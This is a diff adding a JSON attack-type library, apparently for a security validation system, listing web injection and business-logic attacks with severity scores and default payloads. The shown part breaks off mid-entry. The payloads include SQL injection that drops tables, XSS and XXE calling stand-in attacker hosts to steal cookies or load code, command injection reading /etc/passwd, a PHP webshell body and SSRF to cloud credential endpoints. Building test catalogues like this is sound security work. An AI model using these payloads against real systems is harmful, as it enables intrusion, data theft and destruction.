@@ -1,0 +1,2501 @@
+{
+  "_meta": {
+    "version": "1.0",
+    "spec": "IPv6 安全验证系统 §3.6 ★2 攻击组合 — 基础攻击类型库 v1（PR B5 首批 ≥ 250 类）",
+    "total_target": 250,
+    "total_actual": 275,
+    "category_breakdown": {
+      "web_injection": 60,
+      "web_business": 50,
+      "credential": 30,
+      "network_protocol": 30,
+      "c2": 25,
+      "persistence": 25,
+      "privilege_escalation": 20,
+      "discovery": 20,
+      "exploit_cve": 15
+    },
+    "target_layer_breakdown": {
+      "application": 137,
+      "host": 61,
+      "traffic": 77
+    }
+  },
+  "base_attack_types": [
+    {
+      "name": "sql_injection",
+      "category": "web_injection",
+      "display_label": "SQL 注入（通用）",
+      "description": "SQL 注入（通用） —— Web 应用注入类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "' OR '1'='1",
+      "target_layer": "application"
+    },
+    {
+      "name": "sql_injection_union_based",
+      "category": "web_injection",
+      "display_label": "SQL 注入 - UNION 联合查询",
+      "description": "SQL 注入 - UNION 联合查询 —— Web 应用注入类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "' UNION SELECT 1,2,3-- ",
+      "target_layer": "application"
+    },
+    {
+      "name": "sql_injection_error_based",
+      "category": "web_injection",
+      "display_label": "SQL 注入 - 报错回显",
+      "description": "SQL 注入 - 报错回显 —— Web 应用注入类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "' AND 1=CONVERT(int,(SELECT @@version))-- ",
+      "target_layer": "application"
+    },
+    {
+      "name": "sql_injection_boolean_blind",
+      "category": "web_injection",
+      "display_label": "SQL 注入 - 布尔盲注",
+      "description": "SQL 注入 - 布尔盲注 —— Web 应用注入类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "' AND SUBSTRING((SELECT 1),1,1)='1",
+      "target_layer": "application"
+    },
+    {
+      "name": "sql_injection_time_blind",
+      "category": "web_injection",
+      "display_label": "SQL 注入 - 时间盲注",
+      "description": "SQL 注入 - 时间盲注 —— Web 应用注入类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "' AND SLEEP(5)-- ",
+      "target_layer": "application"
+    },
+    {
+      "name": "sql_injection_stacked_queries",
+      "category": "web_injection",
+      "display_label": "SQL 注入 - 多语句堆叠",
+      "description": "SQL 注入 - 多语句堆叠 —— Web 应用注入类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "'; DROP TABLE users;-- ",
+      "target_layer": "application"
+    },
+    {
+      "name": "sql_injection_oob_dns",
+      "category": "web_injection",
+      "display_label": "SQL 注入 - 带外 DNS 回显",
+      "description": "SQL 注入 - 带外 DNS 回显 —— Web 应用注入类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "'; EXEC xp_dirtree '\\\\attacker.example.com\\a';-- ",
+      "target_layer": "application"
+    },
+    {
+      "name": "sql_injection_postgres",
+      "category": "web_injection",
+      "display_label": "PostgreSQL 注入",
+      "description": "PostgreSQL 注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "' OR pg_sleep(5)-- ",
+      "target_layer": "application"
+    },
+    {
+      "name": "sql_injection_mssql",
+      "category": "web_injection",
+      "display_label": "MSSQL 注入",
+      "description": "MSSQL 注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "'; EXEC xp_cmdshell 'whoami';-- ",
+      "target_layer": "application"
+    },
+    {
+      "name": "sql_injection_oracle",
+      "category": "web_injection",
+      "display_label": "Oracle 注入",
+      "description": "Oracle 注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- ",
+      "target_layer": "application"
+    },
+    {
+      "name": "sql_injection_mysql",
+      "category": "web_injection",
+      "display_label": "MySQL 注入",
+      "description": "MySQL 注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "' OR 1=BENCHMARK(5000000,SHA1(1))-- ",
+      "target_layer": "application"
+    },
+    {
+      "name": "sql_injection_sqlite",
+      "category": "web_injection",
+      "display_label": "SQLite 注入",
+      "description": "SQLite 注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "' OR randomblob(1000000000)-- ",
+      "target_layer": "application"
+    },
+    {
+      "name": "xss_reflected",
+      "category": "web_injection",
+      "display_label": "反射型 XSS",
+      "description": "反射型 XSS —— Web 应用注入类基础攻击型",
+      "severity_score": 60,
+      "default_payload": "<script>alert(1)</script>",
+      "target_layer": "application"
+    },
+    {
+      "name": "xss_stored",
+      "category": "web_injection",
+      "display_label": "存储型 XSS",
+      "description": "存储型 XSS —— Web 应用注入类基础攻击型",
+      "severity_score": 75,
+      "default_payload": "<img src=x onerror=alert(1)>",
+      "target_layer": "application"
+    },
+    {
+      "name": "xss_dom",
+      "category": "web_injection",
+      "display_label": "DOM 型 XSS",
+      "description": "DOM 型 XSS —— Web 应用注入类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "#<svg/onload=alert(1)>",
+      "target_layer": "application"
+    },
+    {
+      "name": "xss_blind",
+      "category": "web_injection",
+      "display_label": "盲打 XSS",
+      "description": "盲打 XSS —— Web 应用注入类基础攻击型",
+      "severity_score": 70,
+      "default_payload": "<script src=//evil.example.com/x.js></script>",
+      "target_layer": "application"
+    },
+    {
+      "name": "xss_self",
+      "category": "web_injection",
+      "display_label": "Self XSS",
+      "description": "Self XSS —— Web 应用注入类基础攻击型",
+      "severity_score": 35,
+      "default_payload": "javascript:alert(1)",
+      "target_layer": "application"
+    },
+    {
+      "name": "xss_polyglot",
+      "category": "web_injection",
+      "display_label": "多语境 XSS",
+      "description": "多语境 XSS —— Web 应用注入类基础攻击型",
+      "severity_score": 70,
+      "default_payload": "javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>",
+      "target_layer": "application"
+    },
+    {
+      "name": "xss_csp_bypass",
+      "category": "web_injection",
+      "display_label": "XSS CSP 绕过",
+      "description": "XSS CSP 绕过 —— Web 应用注入类基础攻击型",
+      "severity_score": 75,
+      "default_payload": "<script src=//trusted.cdn/jsonp?callback=alert></script>",
+      "target_layer": "application"
+    },
+    {
+      "name": "xss_mxss",
+      "category": "web_injection",
+      "display_label": "Mutation XSS (mXSS)",
+      "description": "Mutation XSS (mXSS) —— Web 应用注入类基础攻击型",
+      "severity_score": 70,
+      "default_payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"",
+      "target_layer": "application"
+    },
+    {
+      "name": "xss_websocket",
+      "category": "web_injection",
+      "display_label": "WebSocket XSS",
+      "description": "WebSocket XSS —— Web 应用注入类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "<script>new WebSocket('ws://evil/').send(document.cookie)</script>",
+      "target_layer": "application"
+    },
+    {
+      "name": "xss_postmessage",
+      "category": "web_injection",
+      "display_label": "postMessage XSS",
+      "description": "postMessage XSS —— Web 应用注入类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "<script>parent.postMessage('alert(1)','*')</script>",
+      "target_layer": "application"
+    },
+    {
+      "name": "xxe_classic",
+      "category": "web_injection",
+      "display_label": "经典 XXE 文件读取",
+      "description": "经典 XXE 文件读取 —— Web 应用注入类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
+      "target_layer": "application"
+    },
+    {
+      "name": "xxe_blind",
+      "category": "web_injection",
+      "display_label": "Blind XXE 带外",
+      "description": "Blind XXE 带外 —— Web 应用注入类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "<!ENTITY % xxe SYSTEM \"http://evil.example.com/evil.dtd\">",
+      "target_layer": "application"
+    },
+    {
+      "name": "xxe_billion_laughs",
+      "category": "web_injection",
+      "display_label": "Billion Laughs DoS",
+      "description": "Billion Laughs DoS —— Web 应用注入类基础攻击型",
+      "severity_score": 70,
+      "default_payload": "<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">",
+      "target_layer": "application"
+    },
+    {
+      "name": "xxe_xinclude",
+      "category": "web_injection",
+      "display_label": "XInclude XXE",
+      "description": "XInclude XXE —— Web 应用注入类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "<xi:include href=\"file:///etc/passwd\" parse=\"text\"/>",
+      "target_layer": "application"
+    },
+    {
+      "name": "xxe_svg",
+      "category": "web_injection",
+      "display_label": "SVG 文件 XXE",
+      "description": "SVG 文件 XXE —— Web 应用注入类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]>",
+      "target_layer": "application"
+    },
+    {
+      "name": "xxe_office_docx",
+      "category": "web_injection",
+      "display_label": "OOXML 文档 XXE",
+      "description": "OOXML 文档 XXE —— Web 应用注入类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">",
+      "target_layer": "application"
+    },
+    {
+      "name": "ssti_jinja2",
+      "category": "web_injection",
+      "display_label": "Jinja2 模板注入",
+      "description": "Jinja2 模板注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+      "target_layer": "application"
+    },
+    {
+      "name": "ssti_velocity",
+      "category": "web_injection",
+      "display_label": "Velocity 模板注入",
+      "description": "Velocity 模板注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "#set($x='') $x.getClass().forName('java.lang.Runtime').getRuntime().exec('id')",
+      "target_layer": "application"
+    },
+    {
+      "name": "ssti_freemarker",
+      "category": "web_injection",
+      "display_label": "Freemarker 模板注入",
+      "description": "Freemarker 模板注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "<#assign x='freemarker.template.utility.Execute'?new()>${x('id')}",
+      "target_layer": "application"
+    },
+    {
+      "name": "ssti_smarty",
+      "category": "web_injection",
+      "display_label": "Smarty 模板注入",
+      "description": "Smarty 模板注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "{system('id')}",
+      "target_layer": "application"
+    },
+    {
+      "name": "ssti_handlebars",
+      "category": "web_injection",
+      "display_label": "Handlebars 模板注入",
+      "description": "Handlebars 模板注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "{{#with this as |o|}}{{o.constructor.constructor 'return process'}}{{/with}}",
+      "target_layer": "application"
+    },
+    {
+      "name": "ssti_thymeleaf",
+      "category": "web_injection",
+      "display_label": "Thymeleaf 模板注入",
+      "description": "Thymeleaf 模板注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "${T(java.lang.Runtime).getRuntime().exec('id')}",
+      "target_layer": "application"
+    },
+    {
+      "name": "ssti_twig",
+      "category": "web_injection",
+      "display_label": "Twig 模板注入",
+      "description": "Twig 模板注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}",
+      "target_layer": "application"
+    },
+    {
+      "name": "ssti_erb",
+      "category": "web_injection",
+      "display_label": "ERB 模板注入 (Ruby)",
+      "description": "ERB 模板注入 (Ruby) —— Web 应用注入类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "<%= `id` %>",
+      "target_layer": "application"
+    },
+    {
+      "name": "oscommand_injection",
+      "category": "web_injection",
+      "display_label": "OS 命令注入（通用）",
+      "description": "OS 命令注入（通用） —— Web 应用注入类基础攻击型",
+      "severity_score": 95,
+      "default_payload": "; cat /etc/passwd",
+      "target_layer": "application"
+    },
+    {
+      "name": "oscommand_injection_pipe",
+      "category": "web_injection",
+      "display_label": "命令注入 - 管道符",
+      "description": "命令注入 - 管道符 —— Web 应用注入类基础攻击型",
+      "severity_score": 95,
+      "default_payload": "| cat /etc/passwd",
+      "target_layer": "application"
+    },
+    {
+      "name": "oscommand_injection_backtick",
+      "category": "web_injection",
+      "display_label": "命令注入 - 反引号",
+      "description": "命令注入 - 反引号 —— Web 应用注入类基础攻击型",
+      "severity_score": 95,
+      "default_payload": "`id`",
+      "target_layer": "application"
+    },
+    {
+      "name": "oscommand_injection_dollar_paren",
+      "category": "web_injection",
+      "display_label": "命令注入 - $() 子 shell",
+      "description": "命令注入 - $() 子 shell —— Web 应用注入类基础攻击型",
+      "severity_score": 95,
+      "default_payload": "$(id)",
+      "target_layer": "application"
+    },
+    {
+      "name": "oscommand_injection_newline",
+      "category": "web_injection",
+      "display_label": "命令注入 - 换行分隔",
+      "description": "命令注入 - 换行分隔 —— Web 应用注入类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "\nid",
+      "target_layer": "application"
+    },
+    {
+      "name": "oscommand_injection_windows",
+      "category": "web_injection",
+      "display_label": "命令注入 - Windows",
+      "description": "命令注入 - Windows —— Web 应用注入类基础攻击型",
+      "severity_score": 95,
+      "default_payload": "& whoami",
+      "target_layer": "application"
+    },
+    {
+      "name": "oscommand_injection_blind",
+      "category": "web_injection",
+      "display_label": "盲命令注入",
+      "description": "盲命令注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "; ping -c 5 attacker.example.com",
+      "target_layer": "application"
+    },
+    {
+      "name": "oscommand_injection_oob_dns",
+      "category": "web_injection",
+      "display_label": "命令注入 - 带外 DNS 回显",
+      "description": "命令注入 - 带外 DNS 回显 —— Web 应用注入类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "; nslookup `whoami`.attacker.example.com",
+      "target_layer": "application"
+    },
+    {
+      "name": "nosql_injection_mongodb",
+      "category": "web_injection",
+      "display_label": "MongoDB 注入",
+      "description": "MongoDB 注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "{\"$ne\": null}",
+      "target_layer": "application"
+    },
+    {
+      "name": "nosql_injection_couchdb",
+      "category": "web_injection",
+      "display_label": "CouchDB 注入",
+      "description": "CouchDB 注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 75,
+      "default_payload": "_design/x/_view/y",
+      "target_layer": "application"
+    },
+    {
+      "name": "nosql_injection_redis",
+      "category": "web_injection",
+      "display_label": "Redis 命令注入",
+      "description": "Redis 命令注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "\r\nFLUSHALL\r\n",
+      "target_layer": "application"
+    },
+    {
+      "name": "ldap_injection",
+      "category": "web_injection",
+      "display_label": "LDAP 注入",
+      "description": "LDAP 注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 75,
+      "default_payload": "*)(uid=*))(|(uid=*",
+      "target_layer": "application"
+    },
+    {
+      "name": "ldap_injection_blind",
+      "category": "web_injection",
+      "display_label": "盲 LDAP 注入",
+      "description": "盲 LDAP 注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 70,
+      "default_payload": "*)(&(uid=admin)(passwd=a*))",
+      "target_layer": "application"
+    },
+    {
+      "name": "xpath_injection",
+      "category": "web_injection",
+      "display_label": "XPath 注入",
+      "description": "XPath 注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 70,
+      "default_payload": "' or '1'='1",
+      "target_layer": "application"
+    },
+    {
+      "name": "xpath_injection_blind",
+      "category": "web_injection",
+      "display_label": "盲 XPath 注入",
+      "description": "盲 XPath 注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "' and substring(name(/*[1]),1,1)='a",
+      "target_layer": "application"
+    },
+    {
+      "name": "xquery_injection",
+      "category": "web_injection",
+      "display_label": "XQuery 注入",
+      "description": "XQuery 注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 70,
+      "default_payload": "' or '1'='1' or doc('/etc/passwd')",
+      "target_layer": "application"
+    },
+    {
+      "name": "graphql_injection",
+      "category": "web_injection",
+      "display_label": "GraphQL 注入",
+      "description": "GraphQL 注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 70,
+      "default_payload": "{__schema{types{name fields{name}}}}",
+      "target_layer": "application"
+    },
+    {
+      "name": "graphql_introspection",
+      "category": "web_injection",
+      "display_label": "GraphQL Introspection 滥用",
+      "description": "GraphQL Introspection 滥用 —— Web 应用注入类基础攻击型",
+      "severity_score": 50,
+      "default_payload": "{__schema{queryType{name}}}",
+      "target_layer": "application"
+    },
+    {
+      "name": "crlf_injection",
+      "category": "web_injection",
+      "display_label": "CRLF 注入",
+      "description": "CRLF 注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "test\\r\\nSet-Cookie: hijacked=true",
+      "target_layer": "application"
+    },
+    {
+      "name": "http_smuggling",
+      "category": "web_injection",
+      "display_label": "HTTP 请求走私",
+      "description": "HTTP 请求走私 —— Web 应用注入类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "Content-Length: 4\\r\\nTransfer-Encoding: chunked",
+      "target_layer": "application"
+    },
+    {
+      "name": "template_injection_handlebars",
+      "category": "web_injection",
+      "display_label": "Handlebars 客户端模板注入",
+      "description": "Handlebars 客户端模板注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "{{constructor.constructor('alert(1)')()}}",
+      "target_layer": "application"
+    },
+    {
+      "name": "template_injection_angular",
+      "category": "web_injection",
+      "display_label": "Angular 客户端模板注入",
+      "description": "Angular 客户端模板注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "{{constructor.constructor('alert(1)')()}}",
+      "target_layer": "application"
+    },
+    {
+      "name": "expression_language_injection",
+      "category": "web_injection",
+      "display_label": "EL 表达式注入",
+      "description": "EL 表达式注入 —— Web 应用注入类基础攻击型",
+      "severity_score": 88,
+      "default_payload": "${runtime.exec('id')}",
+      "target_layer": "application"
+    },
+    {
+      "name": "ognl_injection",
+      "category": "web_injection",
+      "display_label": "OGNL 注入 (Struts)",
+      "description": "OGNL 注入 (Struts) —— Web 应用注入类基础攻击型",
+      "severity_score": 92,
+      "default_payload": "%{(#cmd='id').(#p=new java.lang.ProcessBuilder({#cmd}))}",
+      "target_layer": "application"
+    },
+    {
+      "name": "csrf_classic",
+      "category": "web_business",
+      "display_label": "CSRF 经典伪造",
+      "description": "CSRF 经典伪造 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 50,
+      "default_payload": "<form action=/admin method=POST><input name=role value=admin></form>",
+      "target_layer": "application"
+    },
+    {
+      "name": "csrf_token_bypass",
+      "category": "web_business",
+      "display_label": "CSRF Token 绕过",
+      "description": "CSRF Token 绕过 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "<form action=/admin method=POST><input name=csrf value=></form>",
+      "target_layer": "application"
+    },
+    {
+      "name": "csrf_samesite_lax_bypass",
+      "category": "web_business",
+      "display_label": "SameSite=Lax CSRF 绕过",
+      "description": "SameSite=Lax CSRF 绕过 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "<a href=/admin/delete>click</a>",
+      "target_layer": "application"
+    },
+    {
+      "name": "csrf_clickjacking",
+      "category": "web_business",
+      "display_label": "Clickjacking + CSRF",
+      "description": "Clickjacking + CSRF —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 55,
+      "default_payload": "<iframe src=/admin/delete style=opacity:0></iframe>",
+      "target_layer": "application"
+    },
+    {
+      "name": "open_redirect_param",
+      "category": "web_business",
+      "display_label": "开放重定向 - 参数",
+      "description": "开放重定向 - 参数 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 50,
+      "default_payload": "https://evil.example.com",
+      "target_layer": "application"
+    },
+    {
+      "name": "open_redirect_path",
+      "category": "web_business",
+      "display_label": "开放重定向 - 路径",
+      "description": "开放重定向 - 路径 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 50,
+      "default_payload": "//evil.example.com/",
+      "target_layer": "application"
+    },
+    {
+      "name": "open_redirect_javascript_uri",
+      "category": "web_business",
+      "display_label": "开放重定向 - javascript URI",
+      "description": "开放重定向 - javascript URI —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "javascript:alert(document.cookie)",
+      "target_layer": "application"
+    },
+    {
+      "name": "unrestricted_upload_php",
+      "category": "web_business",
+      "display_label": "任意文件上传 - PHP",
+      "description": "任意文件上传 - PHP —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "shell.php",
+      "target_layer": "application"
+    },
+    {
+      "name": "unrestricted_upload_jsp",
+      "category": "web_business",
+      "display_label": "任意文件上传 - JSP",
+      "description": "任意文件上传 - JSP —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "shell.jsp",
+      "target_layer": "application"
+    },
+    {
+      "name": "unrestricted_upload_aspx",
+      "category": "web_business",
+      "display_label": "任意文件上传 - ASPX",
+      "description": "任意文件上传 - ASPX —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "shell.aspx",
+      "target_layer": "application"
+    },
+    {
+      "name": "upload_double_extension",
+      "category": "web_business",
+      "display_label": "双扩展名上传绕过",
+      "description": "双扩展名上传绕过 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "shell.php.jpg",
+      "target_layer": "application"
+    },
+    {
+      "name": "upload_null_byte",
+      "category": "web_business",
+      "display_label": "上传 NUL 截断绕过",
+      "description": "上传 NUL 截断绕过 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "shell.php%00.jpg",
+      "target_layer": "application"
+    },
+    {
+      "name": "upload_content_type_bypass",
+      "category": "web_business",
+      "display_label": "Content-Type 校验绕过",
+      "description": "Content-Type 校验绕过 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 75,
+      "default_payload": "image/png + shell.php",
+      "target_layer": "application"
+    },
+    {
+      "name": "upload_magic_bytes_bypass",
+      "category": "web_business",
+      "display_label": "魔数文件头伪装绕过",
+      "description": "魔数文件头伪装绕过 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "GIF89a;<?php system($_GET[c]);?>",
+      "target_layer": "application"
+    },
+    {
+      "name": "upload_polyglot_file",
+      "category": "web_business",
+      "display_label": "多格式 polyglot 文件上传",
+      "description": "多格式 polyglot 文件上传 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "PNG header + PHP body",
+      "target_layer": "application"
+    },
+    {
+      "name": "path_traversal_unix",
+      "category": "web_business",
+      "display_label": "目录穿越 - Unix",
+      "description": "目录穿越 - Unix —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "../../../../etc/passwd",
+      "target_layer": "application"
+    },
+    {
+      "name": "path_traversal_windows",
+      "category": "web_business",
+      "display_label": "目录穿越 - Windows",
+      "description": "目录穿越 - Windows —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "..\\..\\..\\..\\windows\\win.ini",
+      "target_layer": "application"
+    },
+    {
+      "name": "path_traversal_double_encoded",
+      "category": "web_business",
+      "display_label": "目录穿越 - 双重编码",
+      "description": "目录穿越 - 双重编码 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 75,
+      "default_payload": "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+      "target_layer": "application"
+    },
+    {
+      "name": "path_traversal_unicode",
+      "category": "web_business",
+      "display_label": "目录穿越 - Unicode 变形",
+      "description": "目录穿越 - Unicode 变形 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 75,
+      "default_payload": "..%c0%af..%c0%afetc/passwd",
+      "target_layer": "application"
+    },
+    {
+      "name": "lfi_php",
+      "category": "web_business",
+      "display_label": "本地文件包含 - PHP",
+      "description": "本地文件包含 - PHP —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "../../../../etc/passwd",
+      "target_layer": "application"
+    },
+    {
+      "name": "rfi_remote",
+      "category": "web_business",
+      "display_label": "远程文件包含",
+      "description": "远程文件包含 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "http://evil.example.com/shell.txt",
+      "target_layer": "application"
+    },
+    {
+      "name": "ssrf_classic",
+      "category": "web_business",
+      "display_label": "SSRF 经典",
+      "description": "SSRF 经典 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "http://169.254.169.254/latest/meta-data/",
+      "target_layer": "application"
+    },
+    {
+      "name": "ssrf_aws_metadata",
+      "category": "web_business",
+      "display_label": "SSRF AWS 元数据",
+      "description": "SSRF AWS 元数据 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "target_layer": "application"
+    },
+    {
+      "name": "ssrf_gcp_metadata",
+      "category": "web_business",
+      "display_label": "SSRF GCP 元数据",
+      "description": "SSRF GCP 元数据 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "http://metadata.google.internal/computeMetadata/v1/",
+      "target_layer": "application"
+    },
+    {
+      "name": "ssrf_internal_port_scan",
+      "category": "web_business",
+      "display_label": "SSRF 内网端口扫描",
+      "description": "SSRF 内网端口扫描 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 75,
+      "default_payload": "http://10.0.0.1:22/",
+      "target_layer": "application"
+    },
+    {
+      "name": "ssrf_dns_rebinding",
+      "category": "web_business",
+      "display_label": "SSRF DNS 重绑定",
+      "description": "SSRF DNS 重绑定 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "http://rebind.attacker.example.com/",
+      "target_layer": "application"
+    },
+    {
+      "name": "ssrf_gopher_smtp",
+      "category": "web_business",
+      "display_label": "SSRF Gopher SMTP",
+      "description": "SSRF Gopher SMTP —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "gopher://127.0.0.1:25/_HELO%20a%0d%0a",
+      "target_layer": "application"
+    },
+    {
+      "name": "jwt_alg_none",
+      "category": "web_business",
+      "display_label": "JWT alg=none 篡改",
+      "description": "JWT alg=none 篡改 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+      "target_layer": "application"
+    },
+    {
+      "name": "jwt_weak_secret",
+      "category": "web_business",
+      "display_label": "JWT 弱密钥爆破",
+      "description": "JWT 弱密钥爆破 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "secret=123456",
+      "target_layer": "application"
+    },
+    {
+      "name": "jwt_kid_injection",
+      "category": "web_business",
+      "display_label": "JWT kid 头注入",
+      "description": "JWT kid 头注入 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "{\"kid\":\"../../../../dev/null\"}",
+      "target_layer": "application"
+    },
+    {
+      "name": "jwt_jku_injection",
+      "category": "web_business",
+      "display_label": "JWT jku 头注入",
+      "description": "JWT jku 头注入 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 85,
+      "default_payload": "{\"jku\":\"https://evil.example.com/jwks.json\"}",
+      "target_layer": "application"
+    },
+    {
+      "name": "jwt_rsa_to_hs256",
+      "category": "web_business",
+      "display_label": "JWT 算法混淆 RS→HS",
+      "description": "JWT 算法混淆 RS→HS —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 90,
+      "default_payload": "Use RSA pubkey as HMAC secret",
+      "target_layer": "application"
+    },
+    {
+      "name": "session_fixation",
+      "category": "web_business",
+      "display_label": "Session Fixation",
+      "description": "Session Fixation —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 65,
+      "default_payload": "JSESSIONID=ATTACKERSET123",
+      "target_layer": "application"
+    },
+    {
+      "name": "session_hijacking",
+      "category": "web_business",
+      "display_label": "Session 劫持",
+      "description": "Session 劫持 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 75,
+      "default_payload": "Cookie: session=stolen-id",
+      "target_layer": "application"
+    },
+    {
+      "name": "oauth2_redirect_uri_bypass",
+      "category": "web_business",
+      "display_label": "OAuth2 redirect_uri 绕过",
+      "description": "OAuth2 redirect_uri 绕过 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "redirect_uri=https://evil.example.com",
+      "target_layer": "application"
+    },
+    {
+      "name": "business_logic_idor",
+      "category": "web_business",
+      "display_label": "业务逻辑 IDOR",
+      "description": "业务逻辑 IDOR —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 80,
+      "default_payload": "/api/users/12345 → /api/users/12346",
+      "target_layer": "application"
+    },
+    {
+      "name": "business_logic_price_tamper",
+      "category": "web_business",
+      "display_label": "价格篡改",
+      "description": "价格篡改 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 75,
+      "default_payload": "price=0.01",
+      "target_layer": "application"
+    },
+    {
+      "name": "business_logic_race_condition",
+      "category": "web_business",
+      "display_label": "业务逻辑 - 竞态条件",
+      "description": "业务逻辑 - 竞态条件 —— Web 业务逻辑 / 鉴权 / 上传类基础攻击型",
+      "severity_score": 70,
